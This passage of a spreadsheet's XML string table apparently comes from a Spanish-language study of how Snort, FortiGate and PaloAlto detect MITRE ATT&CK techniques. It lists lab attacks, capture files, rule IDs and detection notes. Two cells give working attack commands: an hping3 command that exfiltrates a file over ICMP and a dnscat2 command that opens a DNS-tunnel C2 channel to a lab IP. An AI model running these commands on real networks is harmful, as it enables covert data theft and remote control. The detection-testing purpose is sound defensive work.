    <t>ICMP</t>
  </si>
  <si>
    <t>Exfiltracion mediante protocolo ICMP. Envia varios echo Request que contienen como datos el contenido de ese fichero. Comando: echo "Esto es un exfiltración sobre ICMP" &gt; file;timeout 15s hping3 --file ./file --data 36 192.168.2.2 --icmp</t>
  </si>
  <si>
    <t>Manual [2] /  3.2.2.1</t>
  </si>
  <si>
    <t>Manual [4] / B.27</t>
  </si>
  <si>
    <t>Manual [2] /  4.2.2.2</t>
  </si>
  <si>
    <t>El uso de ICMP para enviar datos se corresponde con un ataque</t>
  </si>
  <si>
    <t>29456, 384, 408</t>
  </si>
  <si>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>29456</t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>, 384, 408</t>
    </r>
  </si>
  <si>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>29456</t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>, 384, 408</t>
    </r>
  </si>
  <si>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>29456</t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>, 384, 408</t>
    </r>
  </si>
  <si>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>29456</t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>, 384, 408</t>
    </r>
  </si>
  <si>
    <t>31767, 29456, 384, 408</t>
  </si>
  <si>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t xml:space="preserve">31767, </t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>29456</t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>, 384, 408</t>
    </r>
  </si>
  <si>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t xml:space="preserve"> </t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>29456</t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>, 384, 408</t>
    </r>
  </si>
  <si>
    <t>2100384, 2002752, 2002749, 2100408, 29456, 384, 408, 31767</t>
  </si>
  <si>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t xml:space="preserve">2100384, 2002752, 2002749, 2100408, </t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>29456,</t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t xml:space="preserve"> 384, 408, 31767</t>
    </r>
  </si>
  <si>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t xml:space="preserve">2100384, 2002752, 2002749, 2100408, </t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>29456,</t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t xml:space="preserve"> 384, 408</t>
    </r>
  </si>
  <si>
    <r>
      <rPr>
        <b/>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>Flujos Detectados Snort</t>
    </r>
    <r>
      <rPr>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>: Snortv2 no identifica el flujo ICMP pero sí lo analiza (genera alertas relacionadas)</t>
    </r>
  </si>
  <si>
    <t>Ping - Has Known Vulnerability</t>
  </si>
  <si>
    <t>Persistence</t>
  </si>
  <si>
    <t>Execution, Privilege Escalation</t>
  </si>
  <si>
    <t>TA0003</t>
  </si>
  <si>
    <t>Scheduled Task/Job</t>
  </si>
  <si>
    <t>T1053</t>
  </si>
  <si>
    <t>At</t>
  </si>
  <si>
    <t>T1053.002</t>
  </si>
  <si>
    <t>Ejecución de tarea mediante uso de comando at para programar la hora de la ejecución</t>
  </si>
  <si>
    <t>Caldera, At</t>
  </si>
  <si>
    <t>T1053.002-Scheduled_TaskJob_At_[5].pcapng</t>
  </si>
  <si>
    <t>Establecimiento de sesión con herramienta Sandcat - T1059</t>
  </si>
  <si>
    <t>Regla genérica que detecte el uso de comando At para programar tareas a una determinada hora o momento</t>
  </si>
  <si>
    <t xml:space="preserve">El ataque consiste en ejecutar una orden en el equipo remoto mediante el uso de At, programando la hora de ejecución de dicha orden. De esta forma, puede obtenerse persistencia, por ejemplo. </t>
  </si>
  <si>
    <t>Manual [5] / 4.3.3</t>
  </si>
  <si>
    <t>Manual [5] / C.42</t>
  </si>
  <si>
    <t>Manual [5] / 5.5.5</t>
  </si>
  <si>
    <t>La programacion de una tarea no necesariamente tiene porque ser un ataque</t>
  </si>
  <si>
    <t>2034567, 2013028, 2019240, 2043217</t>
  </si>
  <si>
    <t>2034567, 2013028, 2019240</t>
  </si>
  <si>
    <t>2034567, 2013028, 2019240, 2043217, 50447</t>
  </si>
  <si>
    <t>50447, 2034567, 2013028, 2019240</t>
  </si>
  <si>
    <t xml:space="preserve">50447, 2002752, 2002749, 2006409, 2034567, 2013028, 2002824, 2019240, 2011803, 2101200, 2101390, 2043217
</t>
  </si>
  <si>
    <t>2002752, 2002749. 2034567, 2013028, 2019240, 50447, 2002824, 2101200, 2006409, 2101390, 2011803</t>
  </si>
  <si>
    <t>2101390, 2011803</t>
  </si>
  <si>
    <t>2002752, 2002749. 2034567, 2013028, 2019240, 50447, 2002824, 2101200, 2006409</t>
  </si>
  <si>
    <r>
      <rPr>
        <b/>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>Instancias Colaterales</t>
    </r>
    <r>
      <rPr>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t xml:space="preserve">: el ataque contiene el establecimiento de sesión mediante la herramienta Sandcat, siendo éste detectado por Snort. </t>
    </r>
  </si>
  <si>
    <r>
      <rPr>
        <b/>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t xml:space="preserve">Ataques Colaterales: </t>
    </r>
    <r>
      <rPr>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>FortiGate detecta el uso de la herramienta CALDERA para el establecimiento de la sesión, pero no detecta la programación de la tarea</t>
    </r>
  </si>
  <si>
    <t>9999, 86782</t>
  </si>
  <si>
    <r>
      <rPr>
        <b/>
        <sz val="14"/>
        <color theme="1"/>
        <rFont val="Arial"/>
        <family val="2"/>
      </rPr>
      <t xml:space="preserve">Ataques Colaterales: </t>
    </r>
    <r>
      <rPr>
        <sz val="14"/>
        <color theme="1"/>
        <rFont val="Arial"/>
        <family val="2"/>
      </rPr>
      <t>PaloAlto detecta el uso de Caldera Sandcat como herramienta C2. Sin embargo, no detecta el ataque en sí. Por tanto, no se consideran los flujos para el calculo de la detección</t>
    </r>
  </si>
  <si>
    <t>Defense Evasion</t>
  </si>
  <si>
    <t>TA0005</t>
  </si>
  <si>
    <t>Indicator Removal</t>
  </si>
  <si>
    <t>T1070</t>
  </si>
  <si>
    <t>Network Share Connection Removal</t>
  </si>
  <si>
    <t>T1070.005</t>
  </si>
  <si>
    <t>Eliminación de conexiones establecidas via Network Share en Windows</t>
  </si>
  <si>
    <t>T1070-Indicator_removal_network_share_connection_removal_[4].pcapng</t>
  </si>
  <si>
    <t>Detección por anomalías basada en desconexión repentina procedente de una dirección de varios recursos compartidos</t>
  </si>
  <si>
    <t>Manual [4] /  3.8</t>
  </si>
  <si>
    <t>Manual [4] / B.8</t>
  </si>
  <si>
    <t>Manual [4] / 4.8</t>
  </si>
  <si>
    <t>La eliminación de conexiones establecidas con Network Share de Windows es legítima en ciertos contextos</t>
  </si>
  <si>
    <t>Application Layer Protocol</t>
  </si>
  <si>
    <t>T1071</t>
  </si>
  <si>
    <t>DNS</t>
  </si>
  <si>
    <t>T1071.004</t>
  </si>
  <si>
    <t>Command - Control via DNS</t>
  </si>
  <si>
    <t>dnscat2</t>
  </si>
  <si>
    <t>T1071-Tunel_[1].pcapng</t>
  </si>
  <si>
    <t>Regla genérica que detecta uso de dnscat</t>
  </si>
  <si>
    <t>Envio de peticiones DNS como canal de comunicaciones con la víctima. Comando: timeout 15s /root/dnscat2/client/dnscat --dns server=192.168.2.2,port=53 --secret= acabc17b6904a7f8fada4e7f8de4bce8 --no-encryption</t>
  </si>
  <si>
    <t>Manual [1] /  5.2.3</t>
  </si>
  <si>
    <t>Manual [1] / E.17</t>
  </si>
  <si>
    <t>Manual [4] / 4.1.30</t>
  </si>
  <si>
    <t>La ocultación de un canal C&amp;C haciendo uso de un tunel DNS siempre es un ataque</t>
  </si>
  <si>
    <t>54827, 13249</t>
  </si>
  <si>
    <t>2002752, 2002749, 2100527, 2013514, 54827, 13249</t>
  </si>
  <si>
    <t>2002752, 2002749, 2100527</t>
  </si>
  <si>
    <t>2002752, 2002749, 2100527, 2013514, 13249</t>
  </si>
  <si>
    <t>2002752, 2002749, 2100527, 13249</t>
  </si>
  <si>
    <t>2013514, 54827</t>
  </si>
  <si>
    <r>
      <rPr>
        <b/>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>Flujos Detectados FG:</t>
    </r>
    <r>
      <rPr>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t xml:space="preserve"> la diferencia entre flujos se debe a la presencia de un flujo htext y un flujo dirigido hacia el puerto 67 (bootps)</t>
    </r>
  </si>
  <si>
    <t>DNS-base - used by malware</t>
  </si>
  <si>
    <t xml:space="preserve">Paloalto detecta el uso de DNSCat como herramienta C2. </t>
  </si>
  <si>
    <t>9</t>
  </si>
  <si>
    <t>Account Discovery</t>
  </si>
  <si>
    <t>T1087</t>
  </si>
  <si>
    <t>Domain Account</t>
  </si>
  <si>
    <t>T1087.002</t>
  </si>
  <si>
    <t>Descubrimiento de cuentas de dominio en entorno Active Directory</t>
  </si>
  <si>
    <t>Caldera, net</t>
  </si>
  <si>
    <t>T1087.002-AccountDiscovery_DomainAccount_[5].pcapng</t>
  </si>
  <si>
    <t>Regla genérica que detecte uso de comandos para enumerar los usuarios o grupos del dominio como net user /domain o net group /domain</t>
  </si>
  <si>
    <t>Ejecución de comandos mediante CMD para enumerar usuarios y grupos del dominio</t>
  </si>
  <si>
    <t>Manual [5] / 4.6.2</t>
  </si>
  <si>
    <t>Manual [5] / C.44</t>
  </si>
  <si>
    <t>Manual [5] / 5.8.6</t>
  </si>
  <si>
    <t>El descubrimiento de cuentas de un dominio AD puede confundirse con actividades de un administrador de red</t>
  </si>
  <si>
    <t>2018959, 2016538, 2014520, 2043217</t>
  </si>
  <si>
    <t>2018959, 2016538, 2014520</t>
  </si>
  <si>
    <t>2018959, 2016538, 2014520, 2043217, 50447</t>
  </si>
  <si>
    <t>2018959, 2016538, 2014520, 50447</t>
  </si>
  <si>
    <t>50447, 2002752, 2002749, 2006408, 2018959, 2016538, 2014520, 2011803, 2101200, 2101390, 2006409, 2043217</t>
  </si>
  <si>
    <t>50447, 2002752, 2002749, 2006408, 2018959, 2016538, 2014520, 2011803, 2101200, 2101390, 2006409</t>
  </si>
  <si>
    <r>
      <rPr>
        <b/>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>Instancias Colaterales</t>
    </r>
    <r>
      <rPr>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>: el ataque hace uso de Sandcat como herramienta auxiliar para el ataque. Sin embargo, se trata de un ataque colateral que sí es detectado por Snort. El ataque principal, sin embargo, no es detectado</t>
    </r>
  </si>
  <si>
    <r>
      <rPr>
        <b/>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t xml:space="preserve">Ataques Colaterales: </t>
    </r>
    <r>
      <rPr>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>FortiGate detecta el uso del agente Caldera, pero no detecta el descubrimiento de cuentas de dominio en sí</t>
    </r>
  </si>
  <si>
    <r>
      <rPr>
        <b/>
        <sz val="14"/>
        <color theme="1"/>
        <rFont val="Arial"/>
        <family val="2"/>
      </rPr>
      <t>Ataques Colaterales</t>
    </r>
    <r>
      <rPr>
        <sz val="14"/>
        <color theme="1"/>
        <rFont val="Arial"/>
        <family val="2"/>
      </rPr>
      <t>: PaloAlto detecta el uso de Caldera Sandcat como herramienta C2. Sin embargo, no detecta el ataque en sí. Por tanto, no se consideran los flujos para el calculo de la detección</t>
    </r>
  </si>
  <si>
    <t>Proxy</t>
  </si>
  <si>
    <t>T1090</t>
  </si>
  <si>
    <t>Internal Proxy</t>
  </si>
  <si>
    <t>T1090.001</t>
  </si>
  <si>
    <t>Uso de Equipo interno como Proxy para el ataque C2</t>
  </si>
  <si>
    <t>T1090-Proxy_internal_proxy_[4].pcapng</t>
  </si>
  <si>
    <t>Establecimiento de canal C&amp;C mediante Covenant - Command and Control</t>
  </si>
  <si>
    <t>Aunque sí es detectable la conexión C2 directa con el atacante, no existe un mecanismo de detección concreto que pueda identificar el uso de un proxy, más allá de una detección por anomalías, como la repetición de paquetes, dando a entender que un equipo interno está replicando paquetes, y por tanto está actuando como proxy</t>
  </si>
  <si>
    <t>Manual [4] /  3.20</t>
  </si>
  <si>
    <t>Manual [4] / B.20</t>
  </si>
  <si>
    <t>Manual [4] / 4.20</t>
  </si>
  <si>
    <t>El uso de un equipo interno como Proxy para comunicaciones C&amp;C siempre es ataque</t>
  </si>
  <si>
    <t>2027794, 2027793, 2027792</t>
  </si>
  <si>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF6AA84F"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>2027794, 2027793, 2027792</t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>, 50447</t>
    </r>
  </si>
  <si>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF6AA84F"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>2027794, 2027793, 2027792</t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>, 50447</t>
    </r>
  </si>
  <si>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF6AA84F"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>2027794, 2027793, 2027792</t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t xml:space="preserve">, 50447, 2002752, 2002749, 2101620 </t>
    </r>
  </si>
  <si>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF6AA84F"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>2027794, 2027793, 2027792</t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t xml:space="preserve">, 50447, 2002752, 2002749, 2101620 </t>
    </r>
  </si>
  <si>
    <t>50447, 2002752, 2002749, 2101620</t>
  </si>
  <si>
    <r>
      <rPr>
        <b/>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>Flujos Detectados Snort</t>
    </r>
    <r>
      <rPr>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>: Snortv2 no analiza dos flujos ICMP</t>
    </r>
  </si>
  <si>
    <r>
      <rPr>
        <b/>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t xml:space="preserve">Ataques Colaterales: </t>
    </r>
    <r>
      <rPr>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>FortiGate detecta el establecimiento del canal C&amp;C, pero no detecta el uso de un equipo interno como Proxy</t>
    </r>
  </si>
  <si>
    <r>
      <rPr>
        <sz val="14"/>
        <color rgb="FF57BB8A"/>
        <rFont val="Arial"/>
        <family val="2"/>
      </rPr>
      <t xml:space="preserve">9999,85585, </t>
    </r>
    <r>
      <rPr>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial"/>
        <family val="2"/>
      </rPr>
      <t>54319, 32880, 56396</t>
    </r>
  </si>
  <si>
    <t>54319, 32880, 56396</t>
  </si>
  <si>
    <r>
      <rPr>
        <b/>
        <sz val="14"/>
        <color theme="1"/>
        <rFont val="Arial"/>
        <family val="2"/>
      </rPr>
      <t>Ataques Colaterales</t>
    </r>
    <r>
      <rPr>
        <sz val="14"/>
        <color theme="1"/>
        <rFont val="Arial"/>
        <family val="2"/>
      </rPr>
      <t xml:space="preserve">: PaloAlto detecta el uso de Covenant como herramienta de C2 . Además, detecta los mensajes beacon correspondientes a Covenant . Los flujos no contarán para el calculo de la capacidad de deteccion        </t>
    </r>
    <r>
      <rPr>
        <b/>
        <sz val="14"/>
        <color theme="1"/>
        <rFont val="Arial"/>
        <family val="2"/>
      </rPr>
      <t xml:space="preserve">Flujos detectados PA: </t>
    </r>
    <r>
      <rPr>
        <sz val="14"/>
        <color theme="1"/>
        <rFont val="Arial"/>
        <family val="2"/>
      </rPr>
      <t>PaloAlto no detecta los flujos ICMPv6, MDNS y LLMNR</t>
    </r>
  </si>
  <si>
    <t>Non-Application Layer Protocol</t>
  </si>
  <si>
    <t>T1095</t>
  </si>
  <si>
    <t>Usar un protocolo que no sea de la capa de Aplicacion en el modelo OSI para esconder la conexión de C2. En este caso utilizamos TCP</t>
  </si>
  <si>
    <t>Caldera, manx</t>
  </si>
  <si>
    <t>T1095-Non_Application_Layer_[3].pcapng</t>
  </si>
  <si>
    <t>Agente Caldera para el establecimiento de la sesión - Command and Control</t>
  </si>
  <si>
    <t>Regla genérica que detecte el envío de comandos o comunicaciones C&amp;C en puertos no comunes o haciendo uso de servicios distintos de capa de aplicación</t>
  </si>
  <si>
    <t>Utilizar la herramienta manx de Caldera para crear sesión C2 mediante TCP</t>
  </si>
  <si>
    <t>Manual [3] / 3.8.13</t>
  </si>
  <si>
    <t>Manual [3] / 3.8.13.4</t>
  </si>
  <si>
    <t>Manual [3] / 3.8.13.5</t>
  </si>
  <si>
    <t>El uso de un protocolo distinto de capa de aplicación para ataques C&amp;C siempre es un ataque</t>
  </si>
  <si>
    <t>2034567, 2013028, 2019240, 2044770</t>
  </si>
  <si>
    <t>2034567, 2013028, 2019240, 2044770, 50447</t>
  </si>
  <si>
    <t>2034567, 2013028, 2019240, 50447</t>
  </si>
  <si>
    <t>50447, 2002752, 2002749, 2006409, 2034567, 2013028, 2002824, 2019240, 2101200, 2044770</t>
  </si>
  <si>
    <t>50447, 2002752, 2002749, 2006409, 2034567, 2013028, 2002824, 2019240, 2101200</t>
  </si>
  <si>
    <r>
      <rPr>
        <b/>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t xml:space="preserve">Ataques Colaterales: </t>
    </r>
    <r>
      <rPr>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>FortiGate detecta el uso del agente Caldera, por lo que se puede afirmar que es válida la detección del ataque colateral, no así del uso de una capa distinta de aplicación para el establecimiento del canal C&amp;C (naturaleza del ataque)</t>
    </r>
  </si>
  <si>
    <t>86786, 86787</t>
  </si>
  <si>
    <r>
      <rPr>
        <b/>
        <sz val="14"/>
        <color theme="1"/>
        <rFont val="Arial"/>
        <family val="2"/>
      </rPr>
      <t xml:space="preserve">Ataques Colaterales: </t>
    </r>
    <r>
      <rPr>
        <sz val="14"/>
        <color theme="1"/>
        <rFont val="Arial"/>
        <family val="2"/>
      </rPr>
      <t>PaloAlto detecta el uso de Caldera Manx como herramienta C2 pero no es capaz de detectar el ataque en sí.</t>
    </r>
  </si>
  <si>
    <t>Web Service</t>
  </si>
  <si>
    <t>T1102</t>
  </si>
  <si>
    <t>One-Way Communication</t>
  </si>
  <si>
    <t>T1102.003</t>
  </si>
  <si>
    <t>Subida de información confidencial a Workspace de Google Drive</t>
  </si>
  <si>
    <t>Covenant, Google Drive API</t>
  </si>
  <si>
    <t>T1102.003-Web_service-one_way_communication_[4].pcapng</t>
  </si>
  <si>
    <t>Manual [4] /  3.21</t>
  </si>
  <si>
    <t>Manual [4] / B.21</t>
  </si>
  <si>
    <t>Manual [4] / 4.21</t>
  </si>
  <si>
    <t>El uso de un servicio Web para subir datos puede confundirse a menudo con actividades legítimas</t>
  </si>
  <si>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF6AA84F"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>2027792, 2027793,</t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t xml:space="preserve"> 2002752, 2002749, 2100628</t>
    </r>
  </si>
  <si>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF6AA84F"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>2027792, 2027793,</t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t xml:space="preserve"> 2002752, 2002749, 2100628</t>
    </r>
  </si>
  <si>
    <t>2002752, 2002749, 2100628</t>
  </si>
  <si>
    <r>
      <rPr>
        <b/>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t xml:space="preserve">Ataques Colaterales: </t>
    </r>
    <r>
      <rPr>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>FortiGate detecta el establecimiento del canal C&amp;C además del ataque principal, que consiste en el uso de servicios de Google</t>
    </r>
  </si>
  <si>
    <t>Google-base</t>
  </si>
  <si>
    <r>
      <rPr>
        <b/>
        <sz val="14"/>
        <color theme="1"/>
        <rFont val="Arial"/>
        <family val="2"/>
      </rPr>
      <t>Ataques Colaterales:</t>
    </r>
    <r>
      <rPr>
        <sz val="14"/>
        <color theme="1"/>
        <rFont val="Arial"/>
        <family val="2"/>
      </rPr>
      <t xml:space="preserve"> PaloAlto detecta el uso de Covenant como herramienta de C2. Además, detecta los mensajes beacon correspondientes a Covenant . Los flujos no contarán para el calculo de la capacidad de deteccion</t>
    </r>
  </si>
  <si>
    <t>Multi-Stage Channels</t>
  </si>
  <si>
    <t>T1104</t>
  </si>
  <si>
    <t>Sesión Remota + Ataque C2</t>
  </si>
  <si>
    <t>RDP, Covenant</t>
  </si>
  <si>
    <t>T1104-Multi_stage_channels_[4].pcapng</t>
  </si>
  <si>
    <t>Manual [4] /  3.22</t>
  </si>
  <si>
    <t>Manual [4] / B.22</t>
  </si>
  <si>
    <t>Manual [4] / 4.22</t>
  </si>
  <si>
    <t>El uso de varias fases y frentes de ataque en una comunicación C&amp;C es siempre un ataque</t>
  </si>
  <si>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF6AA84F"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>2027792, 2027793</t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>, 2002752, 2002749</t>
    </r>
  </si>
  <si>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF6AA84F"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>2027792, 2027793</t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>, 2002752, 2002749</t>
    </r>
  </si>
  <si>
    <r>
      <rPr>
        <b/>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>Ataques Colaterales</t>
    </r>
    <r>
      <rPr>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>: FortIGate detecta el establecimiento del canal de comunicación con la víctima. Sin embargo, no está detectando adecuadamente el uso de un frente de ataque, y la división del ataque en varias fases (lógico atendiendo a la naturaleza de la técnica)</t>
    </r>
  </si>
  <si>
    <r>
      <rPr>
        <b/>
        <sz val="14"/>
        <color theme="1"/>
        <rFont val="Arial"/>
        <family val="2"/>
      </rPr>
      <t>Ataques Colaterales:</t>
    </r>
    <r>
      <rPr>
        <sz val="14"/>
        <color theme="1"/>
        <rFont val="Arial"/>
        <family val="2"/>
      </rPr>
      <t xml:space="preserve"> PaloAlto detecta el uso de Covenant como herramienta de C2. Además, detecta los mensajes beacon correspondientes a Covenant . Los flujos no contarán para el calculo de la capacidad de deteccion</t>
    </r>
  </si>
  <si>
    <t>Ingress Tool Transfer</t>
  </si>
  <si>
    <t>T1105</t>
  </si>
  <si>
    <t>Transferencia de archivos de un servidor C2 a un equipo previamente comprometido</t>
  </si>
  <si>
    <t>Metasploit, FTP</t>
  </si>
  <si>
    <t>T1105-Ingress_Tool_Transfer_[5].pcapng</t>
  </si>
  <si>
    <t>Reglas genéricas que detecten un traspaso de archivos entre equipos utilizando protocolos de transferencia de ficheros como SMB, FTP... Dependiendo de las circunstancias del ataque tambien es importante detectar la transferencia de archivos malware que sean detectables mediante tráfico de red.</t>
  </si>
  <si>
    <t>Servidor FTP en el servidor C2. A través de la conexión del atacante a la víctima, usando el comando ftp transferimos herramientas desde el servidor C2 a la víctima</t>
  </si>
  <si>
    <t>Manual [5] / 4.8.1</t>
  </si>
  <si>
    <t>Manual [5] / C.2</t>
  </si>
  <si>
    <t>Manual [5] /  5.11.7</t>
  </si>
  <si>
    <t>La transferencia de herramientas de ingreso siempre es un ataque</t>
  </si>
  <si>
    <t>2000418, 2014906</t>
  </si>
  <si>
    <t>2002752, 2002749, 2000418, 2011803, 2003303, 2003410, 2014906, 2027768</t>
  </si>
  <si>
    <t>2027768, 2011803</t>
  </si>
  <si>
    <t>2002752, 2002749, 2003303, 2003410</t>
  </si>
  <si>
    <t>655989849, 52175</t>
  </si>
  <si>
    <t>Brute Force</t>
  </si>
  <si>
    <t>T1110</t>
  </si>
  <si>
    <t>Password Spraying</t>
  </si>
  <si>
    <t>T1110.003</t>
  </si>
  <si>
    <t>Ataque de fuerza bruta basado en diccionario de contraseñas</t>
  </si>
  <si>
    <t>wifite</t>
  </si>
  <si>
    <t>T1110-Diccionario_[1].pcapng</t>
  </si>
  <si>
    <t>Manual [1] /  4.2.7</t>
  </si>
  <si>
    <t>Manual [1] / E.26</t>
  </si>
  <si>
    <t>Manual [4] / 4.2.31</t>
  </si>
  <si>
    <t>El uso de fuerza bruta mediante diccionario siempre es un ataque</t>
  </si>
  <si>
    <t>L2 (WPA2)</t>
  </si>
  <si>
    <t>Password Cracking</t>
  </si>
  <si>
    <t>T1110.002</t>
  </si>
  <si>
    <t>Ataque PMKID</t>
  </si>
  <si>
    <t>hashcat, hcxpcapngtool, hcxdumptool</t>
  </si>
  <si>
    <t>T1110-pmkid_[1].pcapng</t>
  </si>
  <si>
    <t>Manual [1] /  4.2.6.3</t>
  </si>
  <si>
    <t>Manual [1] / E.25</t>
  </si>
  <si>
    <t>Manual [4] / 4.2.32</t>
  </si>
  <si>
    <t>Un ataque PMKID siempre es un ataque</t>
  </si>
  <si>
    <t>--</t>
  </si>
  <si>
    <t>PTW/KoreK/FMS</t>
  </si>
  <si>
    <t>T1110-Ptw_korek_[1].pcapng</t>
  </si>
  <si>
    <t>Manual [1] /  4.2.5</t>
  </si>
  <si>
    <t>Manual [1] / E.24</t>
  </si>
  <si>
    <t>Manual [4] / 4.1.33</t>
  </si>
  <si>
    <t>Un ataque de fuerza bruta siempre es un ataque</t>
  </si>
  <si>
    <t>Password Guessing</t>
  </si>
  <si>
    <t>T1110.001</t>
  </si>
  <si>
    <t>Ataque sobre WPS</t>
  </si>
